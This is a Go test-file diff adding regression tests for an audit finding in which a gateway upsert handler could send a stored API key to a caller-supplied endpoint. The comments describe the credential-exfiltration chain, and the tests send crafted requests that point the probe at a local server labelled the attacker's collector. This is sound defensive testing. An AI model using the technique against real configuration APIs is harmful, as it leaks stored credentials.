@@ -94,6 +94,76 @@ func TestGatewaysUpsert_StoresKeyAsFileRef(t *testing.T) {
 	}
 }
 
+// Audit F6 (CWE-200/CWE-918). The upsert handler deliberately PRESERVES a
+// previously-stored api_key_file when the caller omits a key (see
+// TestGatewaysUpsert_PreservesKeyOnEdit — that behaviour is wanted), while
+// taking the endpoint straight from the request body. The save-time probe then
+// resolved the stored key and sent it to that endpoint as a bearer token.
+//
+// Chained, those two reasonable behaviours are an exfiltration primitive: a
+// single PUT naming an existing gateway, supplying only a new endpoint and no
+// key, walks the stored credential to a server the caller controls. The caller
+// never needs to know the key — they just need somewhere to catch it.
+//
+// This is the residual of the deferred half of #3164: confinement stopped
+// arbitrary FILE reads, but said nothing about where an already-resolved key
+// could be SENT. The fix is not to block private IPs — in-cluster gateways are
+// legitimate — but to never pair a STORED credential with a CALLER-SUPPLIED
+// endpoint.
+func TestF6_UpsertProbeDoesNotSendStoredKeyToCallerEndpoint(t *testing.T) {
+	srv := newFullServer(t)
+	dir := t.TempDir()
+	orig := gatewaySecretsDir
+	gatewaySecretsDir = dir
+	t.Cleanup(func() { gatewaySecretsDir = orig })
+
+	// Treat the temp dir as an allowed secrets root. Without this the #3164
+	// confinement rejects the path, ResolveAPIKey returns "", and the test
+	// passes VACUOUSLY — no key resolved means no key to leak, which proves
+	// nothing about the probe. Production reads from a genuinely allowed root,
+	// so the test has to as well.
+	defer config.AllowSecretFileRoot(dir)()
+
+	const stored = "sk-victim-stored-key-abcdef0123456789"
+	keyPath := dir + "/gateway_corp_api_key"
+	if err := os.WriteFile(keyPath, []byte(stored), 0o600); err != nil {
+		t.Fatalf("seed key file: %v", err)
+	}
+
+	// Stands in for the attacker's collector.
+	var got []string
+	attacker := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
+		got = append(got, r.Header.Get("Authorization"))
+		w.Header().Set("Content-Type", "application/json")
+		w.Write([]byte(`{"data":[]}`))
+	}))
+	defer attacker.Close()
+
+	srv.deps.Config.Governor.Gateways = []config.GatewayConfig{
+		{Name: "corp", Kind: "litellm", Endpoint: "https://corp.internal/v1", APIKeyFile: keyPath},
+	}
+
+	// Only the endpoint changes. No api_key, no api_key_file.
+	body := `{"name":"corp","kind":"litellm","endpoint":"` + attacker.URL + `"}`
+	req := httptest.NewRequest("PUT", "/api/config/governor/gateways", strings.NewReader(body))
+	req.Header.Set("Content-Type", "application/json")
+	w := httptest.NewRecorder()
+	srv.handleGovernorGatewaysUpsert(w, req)
+
+	// Positive control. If the key never resolves (a mis-seeded root, a
+	// confinement change) there is nothing to leak and the assertion below is
+	// vacuous. Pin that the scenario is genuinely loaded first.
+	if gw := srv.deps.Config.Governor.Gateways[0]; gw.ResolveAPIKey() != stored {
+		t.Fatalf("test is vacuous: stored key did not resolve (got %q) — the leak assertion would pass for the wrong reason", gw.ResolveAPIKey())
+	}
+
+	for _, h := range got {
+		if strings.Contains(h, stored) {
+			t.Fatalf("F6: stored gateway key exfiltrated to a caller-supplied endpoint via the save-time probe (Authorization: %q)", h)
+		}
+	}
+}
+
 // TestGatewaysUpsert_RejectsInvalidEndpoint ensures a bad endpoint is a 400 and
 // leaves config untouched.
 func TestGatewaysUpsert_RejectsInvalidEndpoint(t *testing.T) {
@@ -178,5 +248,49 @@ func TestGatewaysUpsert_PreservesKeyOnEdit(t *testing.T) {
 	}
 	if gw.DefaultModel != "gpt-4o-mini" {
 		t.Errorf("default_model not updated: %q", gw.DefaultModel)
+	}
+}
+
+// The F6 fix points operators at the /gateways/{name}/test route to verify a
+// gateway whose key they did not resupply. That advice is only sound if the
+// route probes the gateway's PERSISTED endpoint and gives the caller no way to
+// inject one — otherwise it is the same primitive behind a different URL.
+func TestF6_TestRouteUsesPersistedEndpointNotCallerSupplied(t *testing.T) {
+	srv := newFullServer(t)
+	dir := t.TempDir()
+	orig := gatewaySecretsDir
+	gatewaySecretsDir = dir
+	t.Cleanup(func() { gatewaySecretsDir = orig })
+	defer config.AllowSecretFileRoot(dir)()
+
+	const stored = "sk-victim-stored-key-abcdef0123456789"
+	keyPath := dir + "/gateway_corp_api_key"
+	if err := os.WriteFile(keyPath, []byte(stored), 0o600); err != nil {
+		t.Fatalf("seed key file: %v", err)
+	}
+
+	var got []string
+	attacker := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
+		got = append(got, r.Header.Get("Authorization"))
+		w.Header().Set("Content-Type", "application/json")
+		w.Write([]byte(`{"data":[]}`))
+	}))
+	defer attacker.Close()
+
+	// Persisted endpoint is NOT the attacker's.
+	srv.deps.Config.Governor.Gateways = []config.GatewayConfig{
+		{Name: "corp", Kind: "litellm", Endpoint: "http://127.0.0.1:1/v1", APIKeyFile: keyPath},
+	}
+
+	// Try to steer the probe via body and query string.
+	body := `{"endpoint":"` + attacker.URL + `"}`
+	req := httptest.NewRequest("POST", "/api/config/governor/gateways/corp/test?endpoint="+attacker.URL, strings.NewReader(body))
+	req.Header.Set("Content-Type", "application/json")
+	req.SetPathValue("name", "corp")
+	w := httptest.NewRecorder()
+	srv.handleGovernorGatewaysTest(w, req)
+
+	if len(got) != 0 {
+		t.Fatalf("F6: the test route probed a CALLER-SUPPLIED endpoint (%d hits, auth=%v) — it must only use the persisted one", len(got), got)
 	}
 }
